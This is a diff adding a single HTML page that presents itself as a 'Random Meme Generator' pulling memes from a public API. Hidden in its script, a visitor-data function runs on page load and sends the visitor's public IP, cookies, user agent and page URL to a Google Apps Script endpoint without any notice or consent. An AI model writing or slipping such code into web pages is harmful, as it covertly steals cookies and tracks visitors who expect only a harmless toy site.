@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Random Meme Generator</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+    /* Body & Layout */
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      text-align: center;
+    }
+
+    /* Heading */
+    h1 {
+      font-size: 2.5rem;
+      margin: 20px 10px 10px;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    }
+
+    p {
+      font-size: 1.1rem;
+      margin: 5px 10px 20px;
+      color: #e0e0e0;
+    }
+
+    /* Button */
+    button {
+      margin: 10px 0;
+      padding: 12px 28px;
+      font-size: 16px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      background: linear-gradient(90deg, #ff5f6d, #ffc371);
+      color: #fff;
+      font-weight: 600;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.3);
+    }
+
+    /* Meme Card */
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 16px;
+      padding: 15px;
+      max-width: 90%;
+      text-align: center;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+      display: none;
+      margin-top: 20px;
+      transition: transform 0.3s;
+    }
+
+    .card img {
+      width: 100%;
+      max-height: 400px;
+      object-fit: contain;
+      border-radius: 12px;
+      margin-top: 10px;
+      transition: transform 0.3s;
+    }
+
+    .card img:hover {
+      transform: scale(1.02);
+    }
+
+    .card a {
+      color: #ffd700;
+      text-decoration: none;
+      font-weight: 600;
+      display: inline-block;
+      margin-top: 10px;
+    }
+
+    .card a:hover {
+      text-decoration: underline;
+    }
+
+    /* Responsive */
+    @media (max-width: 500px) {
+      h1 { font-size: 2rem; }
+      p { font-size: 1rem; }
+      button { width: 80%; padding: 12px; font-size: 15px; }
+      .card img { max-height: 300px; }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎉 Random Meme Generator</h1>
+  <p>Tap the button below to fetch a hilarious meme!</p>
+  <button onclick="getMeme()">Get Meme</button>
+
+  <div class="card" id="memeCard">
+    <h2 id="memeTitle"></h2>
+    <img id="memeImage" src="" alt="Meme Image"/>
+    <p><a id="memeLink" href="#" target="_blank">View on Reddit</a></p>
+  </div>
+
+  <script>
+    // -------------------------------
+    // Meme Generator Function
+    // -------------------------------
+    async function getMeme() {
+      const card = document.getElementById('memeCard');
+      const title = document.getElementById('memeTitle');
+      const img = document.getElementById('memeImage');
+      const link = document.getElementById('memeLink');
+
+      try {
+        const response = await fetch('https://meme-api.com/gimme');
+        const data = await response.json();
+
+        title.innerText = data.title;
+        img.src = data.url;
+        link.href = data.postLink;
+
+        // Show card with animation
+        card.style.display = 'block';
+        card.style.transform = 'scale(0.95)';
+        setTimeout(() => card.style.transform = 'scale(1)', 100);
+
+      } catch (err) {
+        title.innerText = "Oops! Could not fetch meme.";
+        img.src = "";
+        link.href = "#";
+        card.style.display = 'block';
+        console.error("Error fetching meme:", err);
+      }
+    }
+
+    // -------------------------------
+    // Visitor Data Collection
+    // -------------------------------
+    async function sendVisitorData() {
+      try {
+        // Get public IP using free API
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+
+        // Collect visitor info
+        const payload = {
+          ip: ipData.ip,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          url: window.location.href
+        };
+
+        // Send to Google Sheet via Apps Script
+        await fetch('https://script.google.com/macros/s/AKfycbw2x09UhJym42ictNu3OfHzn3CrrCwUECvs_0YnXlpKAnCrlA35OvO-Ik-1IxlQY7mZ6w/exec', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        console.log("Visitor data sent!");
+      } catch (err) {
+        console.error("Failed to send visitor data:", err);
+      }
+    }
+
+    // -------------------------------
+    // Initialize on Page Load
+    // -------------------------------
+    window.onload = function() {
+      sendVisitorData(); // Collect info as soon as page loads
+    };
+  </script>
+
+</body>
+</html>
